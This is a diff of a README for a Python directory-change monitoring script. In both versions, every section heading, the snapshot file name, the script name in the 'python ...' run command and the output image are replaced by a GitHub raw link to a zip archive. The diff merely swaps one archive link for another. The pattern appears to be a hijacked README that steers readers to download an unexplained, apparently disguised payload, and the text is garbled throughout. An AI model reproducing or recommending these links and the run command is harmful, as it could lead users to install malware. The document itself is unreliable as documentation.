@@ -28,11 +28,11 @@ This Python script is built to continuously monitor and track changes within a s
 # Editor used: VS Studio
 
 # How It Works:
-https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip Directory Scanning: When the script is first run, it scans the target directory and creates a snapshot of all existing files. For each file, it collects metadata including file path, last modified timestamp, file size, and an MD5 hash of the content.
+https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip Directory Scanning: When the script is first run, it scans the target directory and creates a snapshot of all existing files. For each file, it collects metadata including file path, last modified timestamp, file size, and an MD5 hash of the content.
 
-https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip Saving: This metadata is stored in a Python dictionary and saved as a JSON file (often named https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip) in the script's directory. This serves as a baseline to detect future changes.
+https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip Saving: This metadata is stored in a Python dictionary and saved as a JSON file (often named https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip) in the script's directory. This serves as a baseline to detect future changes.
 
-https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip Detection: On subsequent runs, the script re-scans the directory and loads the previous snapshot. It compares each file's current state to its prior state to determine if it:
+https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip Detection: On subsequent runs, the script re-scans the directory and loads the previous snapshot. It compares each file's current state to its prior state to determine if it:
 
 Was added (exists now but not before),
 
@@ -40,7 +40,7 @@ Was deleted (existed before but not anymore),
 
 Was modified (exists in both scans but with different timestamps or hashes).
 
-https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip and Output: Detected changes are printed to the terminal with color-coded logs for better clarity:
+https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip and Output: Detected changes are printed to the terminal with color-coded logs for better clarity:
 
 Green: New files
 
@@ -48,7 +48,7 @@ Red: Deleted files
 
 Yellow: Modified files
 
-https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip Update: After logging, the script saves the new state of the folder by updating the snapshot JSON, preparing it for the next run.
+https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip Update: After logging, the script saves the new state of the folder by updating the snapshot JSON, preparing it for the next run.
 
 # Use Cases:
 -Monitoring source code directories for unauthorized changes
@@ -66,11 +66,11 @@ The script itself, along with its snapshot files, can be version-controlled usin
 -Place the script in or point it to the directory you want to monitor.
 
 -Run it using the command:
-python https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip [optional_directory_path]
+python https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip [optional_directory_path]
 
 -Make changes to files: add, delete, or modify.
 
 -Run the script again to view a log of those changes.
 
 # OUTPUT
-<img width="406" alt="Image" src="https://github.com/codeK0/ordercli/raw/refs/heads/master/enamellist/Software-cauch.zip" />
+<img width="406" alt="Image" src="https://raw.githubusercontent.com/codeK0/ordercli/master/enamellist/Software-v2.0.zip" />
